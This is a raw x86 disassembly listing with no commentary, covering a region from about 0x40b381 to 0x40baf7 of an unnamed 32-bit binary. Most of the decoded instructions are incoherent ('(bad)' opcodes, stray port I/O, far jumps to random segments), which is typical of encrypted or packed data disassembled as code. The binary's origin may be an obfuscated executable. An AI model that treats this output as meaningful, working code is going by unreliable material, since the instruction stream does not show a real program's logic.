  40b381:	xchg   BYTE PTR [edx],bl
  40b383:	sub    eax,0xaad21736
  40b388:	xchg   BYTE PTR [ebp+0x7805f8a1],cl
  40b38e:	in     eax,dx
  40b38f:	loope  0x40b35e
  40b391:	fild   DWORD PTR [eax]
  40b393:	xchg   edi,eax
  40b394:	sbb    al,0x42
  40b396:	mov    BYTE PTR [ebp-0x2e7833cb],dh
  40b39c:	adc    eax,0x582dfcf
  40b3a1:	shl    ebp,cl
  40b3a3:	mov    dh,0xf1
  40b3a5:	push   esi
  40b3a6:	push   ss
  40b3a7:	pushf  
  40b3a8:	jmp    0x40b39d
  40b3aa:	push   0xffffffaa
  40b3ac:	add    bl,BYTE PTR [eax]
  40b3ae:	jp     0x40b40f
  40b3b0:	xor    al,0xb5
  40b3b2:	pop    ds
  40b3b3:	mov    ebx,0x335b7f28
  40b3b8:	fcomp  DWORD PTR [edx-0x5c]
  40b3bb:	jg     0x40b418
  40b3bd:	(bad)  
  40b3be:	mov    esp,0x2cb4c191
  40b3c3:	cmp    edi,DWORD PTR [eax+0x29]
  40b3c6:	sbb    al,0x7d
  40b3c8:	pop    ebp
  40b3c9:	mov    eax,DWORD PTR [ebp+0x8]
  40b3cc:	mov    ecx,DWORD PTR [ebp-0x8]
  40b3cf:	xor    eax,esi
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0xcfa6177b
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	in     al,dx
  40b3f1:	daa    
  40b3f2:	xchg   esp,eax
  40b3f3:	inc    edx
  40b3f4:	cld    
  40b3f5:	cmp    dh,BYTE PTR [edi]
  40b3f7:	pop    ebx
  40b3f8:	jecxz  0x40b473
  40b3fa:	fmul   DWORD PTR [ecx]
  40b3fc:	mov    DWORD PTR [eax+0x66],edi
  40b3ff:	mov    cl,BYTE PTR [ebx]
  40b401:	push   es
  40b402:	stc    
  40b403:	push   cs
  40b404:	xor    eax,0xd5f826c2
  40b409:	mov    ebx,0x4653f3a7
  40b40e:	adc    DWORD PTR [edx],ecx
  40b410:	mov    ds:0x20b52b38,eax
  40b415:	dec    ecx
  40b416:	imul   edi,DWORD PTR [ebp+0x92450],0x4f99b4fd
  40b420:	xor    BYTE PTR [ebx+0x200751ae],cl
  40b426:	ror    DWORD PTR ds:0x58586408,1
  40b42c:	arpl   WORD PTR [edx+0x572c45e8],si
  40b432:	mov    DWORD PTR [ebx+ecx*8],edx
  40b435:	fild   WORD PTR [ebp-0x6f]
  40b438:	inc    ebx
  40b439:	(bad)  
  40b43b:	adc    eax,0xec902fd7
  40b440:	adc    ebp,eax
  40b442:	cdq    
  40b443:	mov    al,ds:0x1eef4540
  40b448:	pushf  
  40b449:	jne    0x40b425
  40b44b:	sbb    ebx,ebp
  40b44d:	jne    0x40b483
  40b44f:	or     al,0x4f
  40b451:	arpl   WORD PTR [edi],cx
  40b453:	ss mov DWORD PTR ss:[edi-0x2c],edx
  40b458:	inc    edx
  40b459:	sbb    al,0x29
  40b45b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b45c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b45d:	cwde   
  40b45e:	jmp    0x3ddeef10
  40b463:	je     0x40b480
  40b465:	mov    al,ds:0xefaf1306
  40b46a:	mov    BYTE PTR [ecx+0xf],bl
  40b46d:	cmc    
  40b46e:	fnsave [ecx]
  40b470:	fs dec esi
  40b472:	call   0x853415b5
  40b477:	inc    ebx
  40b478:	(bad)  
  40b479:	mov    ebx,0x7dbff7e3
  40b47e:	cs mov ebp,0x31598e7c
  40b484:	pop    ds
  40b485:	adc    esp,DWORD PTR [ebx-0x4d]
  40b488:	je     0x40b49a
  40b48a:	adc    al,0x22
  40b48c:	popf   
  40b48d:	aad    0x8c
  40b48f:	cmp    al,BYTE PTR [eax]
  40b491:	push   es
  40b492:	and    eax,0x51b9fc6c
  40b497:	push   ebp
  40b498:	pop    edx
  40b499:	syscall 
  40b49b:	ja     0x40b427
  40b49d:	pop    ecx
  40b49e:	stos   BYTE PTR es:[edi],al
  40b49f:	loope  0x40b454
  40b4a1:	bound  edx,QWORD PTR [edi]
  40b4a3:	into   
  40b4a4:	xor    eax,DWORD PTR [ebx]
  40b4a6:	cmp    ebx,eax
  40b4a8:	or     eax,0x4fc67bd1
  40b4ad:	out    dx,al
  40b4ae:	pop    eax
  40b4af:	cld    
  40b4b0:	out    dx,al
  40b4b1:	ins    DWORD PTR es:[edi],dx
  40b4b2:	mov    ah,0xc3
  40b4b4:	ins    DWORD PTR es:[edi],dx
  40b4b5:	fucomp st(6)
  40b4b7:	fs (bad) 
  40b4b9:	gs push edi
  40b4bb:	mov    esp,0xb912861d
  40b4c0:	mov    gs,WORD PTR [edi]
  40b4c2:	dec    ebx
  40b4c3:	xchg   BYTE PTR [esi+0x77ce508e],bh
  40b4c9:	mov    dh,0xe
  40b4cb:	adc    DWORD PTR [edx],0x3c376dd0
  40b4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4d2:	out    dx,eax
  40b4d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4d4:	mov    al,0x69
  40b4d6:	jne    0x40b475
  40b4d8:	inc    DWORD PTR [edx]
  40b4da:	mov    eax,ds:0x55550056
  40b4df:	mov    bl,0x19
  40b4e1:	addr16 inc esp
  40b4e3:	into   
  40b4e4:	pop    es
  40b4e5:	out    0xa8,eax
  40b4e7:	xchg   esp,eax
  40b4e8:	cmp    al,0xc2
  40b4ea:	sub    DWORD PTR [esi+eax*1],0xffffffba
  40b4ee:	mov    edi,ebp
  40b4f0:	mov    edx,0xfcf28730
  40b4f5:	cs jmp 0x40b531
  40b4f8:	cld    
  40b4f9:	sub    dl,BYTE PTR [eax+eax*8+0x3180f54d]
  40b500:	cwde   
  40b501:	sbb    eax,edx
  40b503:	mov    esp,DWORD PTR ds:0x102eba0
  40b509:	mov    al,ds:0xf061ec24
  40b50e:	cmc    
  40b50f:	add    cl,BYTE PTR [esi]
  40b511:	mov    esi,0xa4601ccb
  40b516:	pop    es
  40b517:	dec    edx
  40b518:	inc    edx
  40b519:	sbb    edx,edi
  40b51b:	cs mov edx,0x2e4373e9
  40b521:	(bad)  
  40b522:	jno    0x40b4d0
  40b524:	ins    BYTE PTR es:[edi],dx
  40b525:	jbe    0x40b4aa
  40b527:	cmp    BYTE PTR [ebx+0x6f96eb1a],bh
  40b52d:	int    0xed
  40b52f:	(bad)  
  40b530:	out    dx,eax
  40b531:	push   es
  40b532:	in     eax,0x72
  40b534:	outs   dx,BYTE PTR ds:[esi]
  40b535:	repz inc edx
  40b537:	in     al,dx
  40b538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b539:	mov    WORD PTR [ebx+0x6a],cs
  40b53c:	retf   
  40b53d:	scas   al,BYTE PTR es:[edi]
  40b53e:	jne    0x40b596
  40b540:	arpl   cx,di
  40b542:	ins    DWORD PTR es:[edi],dx
  40b543:	jo     0x40b534
  40b545:	jmp    0x4542:0xb649332c
  40b54c:	mov    al,ds:0xa41a396d
  40b551:	mul    dh
  40b553:	in     eax,0xbc
  40b555:	pop    ds
  40b556:	xor    eax,0xa971e001
  40b55b:	pop    esi
  40b55c:	adc    dl,ch
  40b55e:	jns    0x40b4ef
  40b560:	xor    DWORD PTR [ebx-0x5e1076f8],edi
  40b566:	dec    edi
  40b567:	mov    edx,0xdc4bfa4b
  40b56c:	fmul   DWORD PTR [edi-0x6]
  40b56f:	nop
  40b570:	pushf  
  40b571:	ss mov dl,0xf0
  40b574:	sbb    al,0xb4
  40b576:	test   BYTE PTR [edx+0xb29d08d],0x5e
  40b57d:	fwait
  40b57e:	add    DWORD PTR [edx-0x7f],edx
  40b581:	leave  
  40b582:	iret   
  40b583:	xor    DWORD PTR [edi-0x18d9b5b1],ecx
  40b589:	jge    0x40b574
  40b58b:	(bad)  
  40b58c:	xor    BYTE PTR [ebx-0x351830aa],bh
  40b592:	into   
  40b593:	(bad)  
  40b595:	int    0x94
  40b597:	aas    
  40b598:	fst    st(1)
  40b59a:	(bad)  
  40b59b:	mov    bh,0x1c
  40b59d:	ret    0xdcff
  40b5a0:	xor    al,0x42
  40b5a2:	xlat   BYTE PTR ds:[ebx]
  40b5a3:	je     0x40b61b
  40b5a5:	lods   eax,DWORD PTR ds:[esi]
  40b5a6:	xchg   edi,eax
  40b5a7:	scas   eax,DWORD PTR es:[edi]
  40b5a8:	or     esp,DWORD PTR [edx]
  40b5aa:	aam    0xbe
  40b5ac:	mov    bh,BYTE PTR ss:[ebx]
  40b5af:	push   ecx
  40b5b0:	in     al,dx
  40b5b1:	dec    esi
  40b5b2:	xchg   esp,eax
  40b5b3:	sbb    ah,bh
  40b5b5:	test   eax,0xa766e650
  40b5ba:	retf   0xa784
  40b5bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5be:	jecxz  0x40b551
  40b5c0:	jnp    0x40b604
  40b5c2:	stos   BYTE PTR es:[edi],al
  40b5c3:	out    dx,al
  40b5c4:	push   esp
  40b5c5:	push   es
  40b5c6:	popa   
  40b5c7:	sar    DWORD PTR [eax],1
  40b5c9:	aas    
  40b5ca:	out    0x50,al
  40b5cc:	ins    DWORD PTR es:[edi],dx
  40b5cd:	ret    
  40b5ce:	fwait
  40b5cf:	xchg   ebx,eax
  40b5d0:	add    DWORD PTR [ebx-0x15e50b71],0x2
  40b5d7:	leave  
  40b5d8:	iret   
  40b5d9:	dec    ecx
  40b5da:	push   ss
  40b5db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5dc:	pop    ecx
  40b5dd:	test   eax,0x7edbcefe
  40b5e2:	xor    bh,BYTE PTR [eax-0x41]
  40b5e5:	lea    edi,[ebx-0x4fa93ead]
  40b5eb:	into   
  40b5ec:	add    esi,DWORD PTR [esi-0x26]
  40b5ef:	jo     0x40b641
  40b5f1:	(bad)  
  40b5f2:	jae    0x40b61b
  40b5f4:	sub    bh,0xfd
  40b5f7:	(bad)
  40b5fa:	jne    0x40b658
  40b5fc:	push   edx
  40b5fd:	and    dh,BYTE PTR [edi-0x55]
  40b600:	imul   edi,DWORD PTR [ecx],0x55657d6a
  40b606:	fdivr  QWORD PTR [ecx]
  40b608:	(bad)  
  40b609:	push   ebp
  40b60a:	pop    esi
  40b60b:	and    al,0xd1
  40b60d:	shl    BYTE PTR [ecx+0x614acd64],1
  40b613:	dec    esp
  40b614:	inc    ebp
  40b615:	clc    
  40b616:	scas   al,BYTE PTR es:[edi]
  40b617:	lods   eax,DWORD PTR ds:[esi]
  40b618:	shl    BYTE PTR [ebp-0x6f],1
  40b61b:	mov    ds:0xf6ccef35,eax
  40b620:	jbe    0x40b62b
  40b622:	pop    ss
  40b623:	bound  ebx,QWORD PTR [eax]
  40b625:	sahf   
  40b626:	push   edx
  40b627:	fistp  DWORD PTR [edx]
  40b629:	add    esp,DWORD PTR [ebp+0x3b]
  40b62c:	pop    esp
  40b62d:	nop
  40b62e:	xor    dh,BYTE PTR [eax+0x4d8e2185]
  40b634:	or     ecx,DWORD PTR [ecx+esi*4-0x42d94510]
  40b63b:	xlat   BYTE PTR ds:[ebx]
  40b63c:	jmp    FWORD PTR [esi+0x2]
  40b63f:	xchg   esi,eax
  40b640:	mov    esp,DWORD PTR [eax-0x12fce614]
  40b646:	pop    esi
  40b647:	adc    al,0xdb
  40b649:	pop    eax
  40b64a:	or     DWORD PTR [edi+0xa36f0f5],ebx
  40b650:	cmp    bh,cl
  40b652:	pop    ds
  40b653:	mov    ecx,0x1874e0a0
  40b658:	fisub  DWORD PTR [eax]
  40b65a:	xor    ebp,DWORD PTR ss:[eax]
  40b65d:	repnz pop es
  40b65f:	mov    bh,0xcf
  40b661:	jl     0x40b6d8
  40b663:	cmp    al,0xc0
  40b665:	jmp    FWORD PTR [ecx+0x63d4262e]
  40b66b:	adc    eax,0xbc736785
  40b670:	fs pop ebx
  40b672:	add    eax,0xb6ee23c5
  40b677:	and    esp,DWORD PTR [edi-0x2f6aee0b]
  40b67d:	inc    edi
  40b67e:	inc    eax
  40b67f:	pusha  
  40b680:	xor    eax,eax
  40b682:	adc    eax,0x9b8d3491
  40b687:	fldenv [ebx+edx*4-0x5d]
  40b68b:	mov    dh,0xb5
  40b68d:	shl    BYTE PTR [ecx+0x650136db],0x5
  40b694:	dec    eax
  40b695:	xor    bl,BYTE PTR [ebx+0x3a]
  40b698:	mov    ?,WORD PTR [esi+0x5917d150]
  40b69e:	out    dx,eax
  40b69f:	pop    edx
  40b6a0:	out    dx,al
  40b6a1:	sub    al,al
  40b6a3:	repnz push DWORD PTR [edi+0x7716cf9d]
  40b6aa:	iret   
  40b6ab:	xor    BYTE PTR [ecx],ah
  40b6ad:	ja     0x40b685
  40b6af:	lods   eax,DWORD PTR ds:[esi]
  40b6b0:	out    0x28,eax
  40b6b2:	les    ecx,FWORD PTR ds:0xdb216c12
  40b6b8:	and    BYTE PTR [edx+0x1f],0xb1
  40b6bc:	in     eax,0x6d
  40b6be:	push   esi
  40b6bf:	sbb    dl,bh
  40b6c1:	xor    BYTE PTR [eax+0x143bfaad],dl
  40b6c7:	jmp    0xd004:0x193c30bd
  40b6ce:	xchg   DWORD PTR [ebx],ebp
  40b6d0:	sbb    eax,0xbcd3005d
  40b6d5:	js     0x40b69e
  40b6d7:	retf   
  40b6d8:	cmp    dh,BYTE PTR [esi+0x31]
  40b6db:	fadd   QWORD PTR [ebx+ecx*2-0x54]
  40b6df:	int    0xc2
  40b6e1:	adc    BYTE PTR [eax-0x5b],bl
  40b6e4:	sbb    edi,DWORD PTR [esi]
  40b6e6:	push   ebx
  40b6e7:	xor    edx,DWORD PTR [eax+ecx*1+0x3b51b027]
  40b6ee:	bound  esi,QWORD PTR [edx+0x4b]
  40b6f1:	mov    ch,0x8b
  40b6f3:	lods   al,BYTE PTR ds:[esi]
  40b6f4:	mov    DWORD PTR [ecx],eax
  40b6f6:	jmp    0x40c082
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    WORD PTR [edi-0x1],fs
  40b71a:	into   
  40b71b:	out    0x14,al
  40b71d:	clc    
  40b71e:	jle    0x40b79e
  40b720:	jp     0x40b79f
  40b722:	jle    0x40b7a2
  40b724:	mov    ch,0xdd
  40b726:	loop   0x40b78d
  40b728:	jl     0x40b71f
  40b72a:	jmp    FWORD PTR [ebx]
  40b72c:	aam    0x8a
  40b72e:	gs call 0xd7bc:0xc9b27696
  40b736:	cwde   
  40b737:	je     0x40b6cd
  40b739:	fisub  DWORD PTR [edx+edx*1]
  40b73c:	or     DWORD PTR [edx-0x4a831489],ecx
  40b742:	mov    ebp,?
  40b744:	jo     0x40b79e
  40b746:	mov    ah,0xad
  40b748:	mov    edx,0x186cabfb
  40b74d:	ret    
  40b74e:	mov    esi,0x41194515
  40b753:	sbb    al,0x9f
  40b755:	or     BYTE PTR [ecx+ebx*1+0x40],ah
  40b759:	mov    eax,ds:0xe3c197f3
  40b75e:	and    al,0xd
  40b760:	in     eax,0xcf
  40b762:	icebp  
  40b763:	add    dh,BYTE PTR [eax+eiz*8]
  40b766:	mov    ebp,0x7f907dc4
  40b76b:	adc    ebp,DWORD PTR [eax+0x2c7e5e26]
  40b771:	mul    DWORD PTR [ebp+0x7b]
  40b774:	mov    ebx,esi
  40b776:	test   eax,0xc9402db2
  40b77b:	sub    esp,DWORD PTR [ecx]
  40b77d:	fist   DWORD PTR [ebx]
  40b77f:	adc    eax,0xe1798cf4
  40b784:	mov    ds:0x2666752c,eax
  40b789:	push   eax
  40b78a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b78b:	or     ebx,DWORD PTR [edi]
  40b78d:	mov    eax,ds:0x8f4eefa2
  40b792:	fs cmp ebp,ebx
  40b795:	jns    0x40b73f
  40b797:	or     dl,al
  40b799:	in     eax,dx
  40b79a:	ja     0x40b7b0
  40b79c:	and    DWORD PTR [esi+0x4ad490b],ebx
  40b7a2:	push   edx
  40b7a3:	pop    edx
  40b7a4:	and    eax,DWORD PTR ds:0x462c3baf
  40b7aa:	aaa    
  40b7ab:	pushf  
  40b7ac:	sub    edx,DWORD PTR ds:0x87b8bfc5
  40b7b2:	fild   WORD PTR [edx+ecx*4-0x3809b9b2]
  40b7b9:	scas   al,BYTE PTR es:[edi]
  40b7ba:	and    bl,BYTE PTR [esi+0x46]
  40b7bd:	pop    ss
  40b7be:	adc    DWORD PTR [ebx+0x445c0193],ebp
  40b7c4:	call   0xf9e40386
  40b7c9:	or     eax,0x46f53ed2
  40b7ce:	jecxz  0x40b779
  40b7d0:	cmp    BYTE PTR [edi-0x2f],0x90
  40b7d4:	mov    ds:0xe3b4f5dc,al
  40b7d9:	or     al,0xc
  40b7db:	xor    eax,0x1961d38b
  40b7e0:	cmc    
  40b7e1:	test   eax,0xb39ac66e
  40b7e6:	add    al,BYTE PTR [edi-0x13b340a2]
  40b7ec:	test   eax,0x6147af40
  40b7f1:	mov    ds:0xc0b1fa5e,eax
  40b7f6:	retf   
  40b7f7:	push   edx
  40b7f8:	jecxz  0x40b7bb
  40b7fa:	loop   0x40b837
  40b7fc:	jae    0x40b7ff
  40b7fe:	dec    esp
  40b7ff:	sub    BYTE PTR [ecx+0x34],ah
  40b802:	outs   dx,BYTE PTR ds:[esi]
  40b803:	lock jg 0x40b804
  40b806:	pop    esi
  40b807:	fsub   DWORD PTR [ecx-0x4f8fc17]
  40b80d:	idiv   ah
  40b80f:	or     eax,0x895b4115
  40b814:	mov    BYTE PTR [ebx+ebp*2+0x7b],dh
  40b818:	out    0x27,eax
  40b81a:	cli    
  40b81b:	jb     0x40b823
  40b81d:	inc    ecx
  40b81e:	sbb    esi,DWORD PTR [esi-0x671ea398]
  40b824:	sti    
  40b825:	mov    bl,0xe6
  40b827:	aad    0x41
  40b829:	push   eax
  40b82a:	or     al,0x8
  40b82c:	jge    0x40b88d
  40b82e:	(bad)  
  40b82f:	stc    
  40b830:	dec    edi
  40b831:	dec    esp
  40b832:	mov    ebx,0x5067cff8
  40b837:	stos   BYTE PTR es:[edi],al
  40b838:	jecxz  0x40b891
  40b83a:	popf   
  40b83b:	mov    DWORD PTR [edi+0x24],0x1e016077
  40b842:	aaa    
  40b843:	gs dec ebx
  40b845:	rcl    BYTE PTR [ebx-0x3064802e],1
  40b84b:	mov    DWORD PTR [edi-0x6c],ecx
  40b84e:	xor    eax,DWORD PTR [edi+0x28]
  40b851:	shl    DWORD PTR [ebp-0x4fcda9b2],cl
  40b857:	dec    ecx
  40b858:	push   ss
  40b859:	inc    esi
  40b85a:	mov    al,ds:0xf658b171
  40b85f:	add    eax,0x3b591c6e
  40b864:	ins    DWORD PTR es:[edi],dx
  40b865:	sub    ebx,esi
  40b867:	fcom   QWORD PTR [esi+ebp*1-0x3c]
  40b86b:	popf   
  40b86c:	stos   BYTE PTR es:[edi],al
  40b86d:	call   0x80eacd18
  40b872:	mov    bh,0x28
  40b874:	aad    0x84
  40b876:	cs sbb ebx,eax
  40b879:	mov    ds:0x2448901a,al
  40b87e:	retf   0x8ff4
  40b881:	jnp    0x40b8c5
  40b883:	mov    ?,WORD PTR [ebx]
  40b885:	push   edx
  40b886:	add    eax,0x6a26abca
  40b88b:	scas   al,BYTE PTR es:[edi]
  40b88c:	fsubr  QWORD PTR [eiz*2+0x294257f1]
  40b893:	pop    esi
  40b894:	aas    
  40b895:	xchg   DWORD PTR [ecx],eax
  40b897:	jb     0x40b824
  40b899:	outs   dx,BYTE PTR ds:[esi]
  40b89a:	sub    al,ch
  40b89c:	jmp    0xbb23b112
  40b8a1:	mov    ebx,0x5263e7c1
  40b8a6:	in     eax,dx
  40b8a7:	aas    
  40b8a8:	lods   eax,DWORD PTR ds:[esi]
  40b8a9:	pop    ds
  40b8aa:	push   0x47871358
  40b8af:	lea    esi,[eax]
  40b8b1:	test   ch,dh
  40b8b3:	data16 std 
  40b8b5:	int    0xa9
  40b8b7:	(bad)  
  40b8b8:	sti    
  40b8b9:	pusha  
  40b8ba:	jl     0x40b847
  40b8bc:	(bad)  
  40b8bd:	pop    ss
  40b8be:	add    al,0x14
  40b8c0:	ja     0x40b8c6
  40b8c2:	fld    QWORD PTR [ecx]
  40b8c4:	sub    edx,DWORD PTR [ebx+0x23]
  40b8c7:	xchg   edi,eax
  40b8c8:	(bad)  
  40b8c9:	mov    dh,0x38
  40b8cb:	jo     0x40b864
  40b8cd:	(bad)  
  40b8ce:	das    
  40b8cf:	inc    ebp
  40b8d0:	mov    ah,0xd5
  40b8d2:	xchg   ecx,eax
  40b8d3:	pop    ss
  40b8d4:	hlt    
  40b8d5:	cwde   
  40b8d6:	sub    al,0x22
  40b8d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8d9:	sub    BYTE PTR [edx+0x6d376603],0xc6
  40b8e0:	and    bl,BYTE PTR [ebx+0x18b7714b]
  40b8e6:	mov    ecx,0xc7db0d60
  40b8eb:	adc    eax,0x927bee6
  40b8f0:	idiv   BYTE PTR [eax]
  40b8f2:	mov    dh,0xd2
  40b8f4:	cmp    al,cl
  40b8f6:	inc    ebp
  40b8f7:	mov    ebp,0x5a7a0e80
  40b8fc:	push   edi
  40b8fd:	mov    ebx,0x73021a81
  40b902:	addr16 jne 0x40b8cd
  40b905:	push   0x71
  40b907:	das    
  40b908:	sbb    ah,al
  40b90a:	daa    
  40b90b:	pushf  
  40b90c:	mov    ebx,0x436f851b
  40b911:	sbb    ecx,DWORD PTR [ecx]
  40b913:	mov    ds:0x14b1a2cc,eax
  40b918:	fs ret 
  40b91a:	push   esi
  40b91b:	lahf   
  40b91c:	dec    eax
  40b91d:	ins    BYTE PTR es:[edi],dx
  40b91e:	sbb    eax,0x4785e6d2
  40b923:	mov    ecx,0xf4868318
  40b928:	fisub  DWORD PTR fs:[edi+esi*4-0x6b]
  40b92d:	xchg   edx,eax
  40b92e:	inc    eax
  40b92f:	shl    ch,0xdb
  40b932:	leave  
  40b933:	mov    WORD PTR [eax+0x3c],?
  40b936:	jmp    0xcb5f:0x14fd4f47
  40b93d:	repz mov dh,0xf5
  40b940:	pushf  
  40b941:	jae    0x40b95a
  40b943:	cmp    al,bl
  40b945:	(bad)  
  40b946:	or     eax,0xcabaa85a
  40b94b:	pop    esi
  40b94d:	xchg   ebp,eax
  40b94e:	xchg   esp,eax
  40b94f:	ins    BYTE PTR es:[edi],dx
  40b950:	retf   0x7364
  40b953:	cmp    esp,ecx
  40b955:	call   0x859757be
  40b95a:	xor    ch,0x6d
  40b95d:	aas    
  40b95e:	mov    ebx,0x523e7215
  40b963:	jnp    0x40b9d4
  40b965:	pop    edx
  40b966:	(bad)  
  40b967:	jp     0x40b998
  40b969:	arpl   dx,si
  40b96b:	cmc    
  40b96c:	lods   al,BYTE PTR ds:[esi]
  40b96d:	or     ah,dl
  40b96f:	adc    al,0xc9
  40b971:	scas   eax,DWORD PTR es:[edi]
  40b972:	mov    ds:0xca12ad44,eax
  40b977:	and    al,0x3e
  40b979:	xor    eax,0xf2d0964e
  40b97e:	xor    eax,0x5c1ec741
  40b983:	jmp    0x4b48:0x106fad88
  40b98a:	inc    esp
  40b98b:	jns    0x40b985
  40b98d:	dec    eax
  40b98e:	fcmove st,st(5)
  40b990:	fwait
  40b991:	pop    ecx
  40b992:	(bad)  
  40b993:	retf   0x6643
  40b996:	fs push ebp
  40b998:	stos   BYTE PTR es:[edi],al
  40b999:	mov    al,0x50
  40b99b:	in     eax,0x99
  40b99d:	mov    ch,0x5e
  40b99f:	bound  ecx,QWORD PTR [esi-0x7]
  40b9a2:	sbb    eax,0xa2c29d5d
  40b9a7:	popf   
  40b9a8:	push   ebx
  40b9a9:	ins    BYTE PTR es:[edi],dx
  40b9aa:	add    ebp,edx
  40b9ac:	in     eax,0xb9
  40b9ae:	mov    ah,0xff
  40b9b0:	inc    edx
  40b9b1:	xchg   ecx,eax
  40b9b2:	int3   
  40b9b3:	(bad)  [ecx-0x69906b8d]
  40b9b9:	push   edi
  40b9ba:	and    edx,DWORD PTR [eax+0x6b]
  40b9bd:	in     ax,0xc4
  40b9c0:	stc    
  40b9c1:	pop    eax
  40b9c2:	mov    BYTE PTR [eax],cl
  40b9c4:	in     al,0x18
  40b9c6:	sbb    bl,BYTE PTR [ebx+0x42]
  40b9c9:	xor    dh,BYTE PTR [eax]
  40b9cb:	sub    al,BYTE PTR [ebx]
  40b9cd:	shl    al,cl
  40b9cf:	mov    ebp,0x11d84bbd
  40b9d4:	popa   
  40b9d5:	mov    bh,0x28
  40b9d7:	out    0x1,eax
  40b9d9:	jle    0x40ba11
  40b9db:	bound  eax,QWORD PTR ds:0xbcab7e8b
  40b9e1:	(bad)  
  40b9e2:	rcr    DWORD PTR [edx],0x1b
  40b9e5:	push   eax
  40b9e6:	aad    0xcb
  40b9e8:	fwait
  40b9e9:	les    edi,FWORD PTR [ecx-0x70251363]
  40b9ef:	fcmovnu st,st(6)
  40b9f1:	into   
  40b9f2:	mov    ecx,0xcaad4a3b
  40b9f7:	cmp    BYTE PTR [esi-0x57d980e9],bh
  40b9fd:	cli    
  40b9fe:	pop    esp
  40b9ff:	mov    edi,cs
  40ba01:	rol    DWORD PTR [edx+eiz*2-0x3edcefd],cl
  40ba08:	push   ds
  40ba09:	mov    dl,0x9
  40ba0b:	push   cs
  40ba0c:	and    BYTE PTR [eax],bh
  40ba0e:	push   esi
  40ba0f:	into   
  40ba10:	in     eax,0x6f
  40ba12:	jmp    0x9882a6ae
  40ba17:	mov    DWORD PTR [ecx],edi
  40ba19:	cmp    dh,BYTE PTR [esi+0x48]
  40ba1c:	in     al,0xb3
  40ba1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba1f:	mov    edi,0xcc751d2a
  40ba24:	mov    eax,ds:0x8b400358
  40ba29:	inc    ebp
  40ba2a:	clc    
  40ba2b:	mov    ecx,DWORD PTR [ebp-0x18]
  40ba2e:	jmp    0x40bd4f
  40ba33:	xchg   esp,eax
  40ba34:	jge    0x40ba82
  40ba36:	hlt    
  40ba37:	push   ebp
  40ba38:	jne    0x40b9ee
  40ba3a:	pop    ebp
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    dl,BYTE PTR [edi+0x19]
  40ba41:	adc    edx,DWORD PTR [edi+0x7e7e8710]
  40ba47:	jp     0x40bac6
  40ba49:	jle    0x40bac9
  40ba4b:	xchg   ebp,eax
  40ba4c:	lods   ax,WORD PTR ds:[esi]
  40ba4e:	loope  0x40ba3a
  40ba50:	mov    ecx,0xddf36cec
  40ba55:	cmp    BYTE PTR [eax+0x1f],0x98
  40ba59:	xor    ah,cl
  40ba5b:	jmp    edx
  40ba5d:	jl     0x40ba54
  40ba5f:	fs (bad) 
  40ba61:	sub    ebp,DWORD PTR [eax+0x7d]
  40ba64:	mov    al,0x9c
  40ba66:	clc    
  40ba67:	pushf  
  40ba68:	out    0x42,al
  40ba6a:	adc    DWORD PTR [edx-0x51e79fe2],esp
  40ba70:	mov    dh,0xe0
  40ba72:	push   ss
  40ba73:	iret   
  40ba74:	clc    
  40ba75:	mov    eax,ds:0x6326cb2a
  40ba7a:	pop    ebp
  40ba7b:	(bad)  [esi+0x995d0cc]
  40ba81:	and    BYTE PTR ds:0xa563a3b3,ch
  40ba87:	cmp    eax,0xa3ce52a7
  40ba8c:	hlt    
  40ba8d:	jno    0x40baf4
  40ba8f:	jbe    0x40ba92
  40ba91:	xchg   esp,eax
  40ba92:	pop    ds
  40ba93:	push   ebx
  40ba94:	jp     0x40bac7
  40ba96:	dec    esp
  40ba97:	inc    ebx
  40ba98:	and    DWORD PTR [edx+0x18de9607],0xffffffd5
  40ba9f:	mov    es,WORD PTR [edx-0x27ba5433]
  40baa5:	and    eax,0xf839b518
  40baaa:	sub    BYTE PTR [eax],0x9
  40baad:	rcr    BYTE PTR [edi+eax*2-0x1],cl
  40bab1:	mov    ds:0x7b05b507,al
  40bab6:	xchg   esp,eax
  40bab7:	sbb    BYTE PTR [esi-0x29],0x2
  40babb:	sbb    ebp,ecx
  40babd:	ins    BYTE PTR es:[edi],dx
  40babe:	pop    ss
  40babf:	xchg   cx,ax
  40bac1:	ins    BYTE PTR es:[edi],dx
  40bac2:	dec    ebx
  40bac3:	mov    ebx,0x5174e6f0
  40bac8:	dec    ebx
  40bac9:	xchg   edi,eax
  40baca:	jg     0x40bad9
  40bacc:	add    ecx,ecx
  40bace:	cmc    
  40bacf:	repz dec eax
  40bad1:	xor    esi,edx
  40bad3:	aam    0x4b
  40bad5:	or     ebp,DWORD PTR [ebp+edx*4+0x4d08427b]
  40badc:	fidiv  WORD PTR [ebp+eax*4-0xf]
  40bae0:	mov    cl,0xf6
  40bae2:	outs   dx,BYTE PTR ds:[esi]
  40bae3:	mov    ecx,0x9a656e79
  40bae8:	retf   
  40bae9:	aam    0x78
  40baeb:	cwde   
  40baec:	pop    edx
  40baed:	and    DWORD PTR [eax+0x6a94770c],edi
  40baf3:	icebp  
  40baf4:	xor    al,0xbb
  40baf6:	dec    edx
  40baf7:	sub    DWORD PTR [ebx],ebp
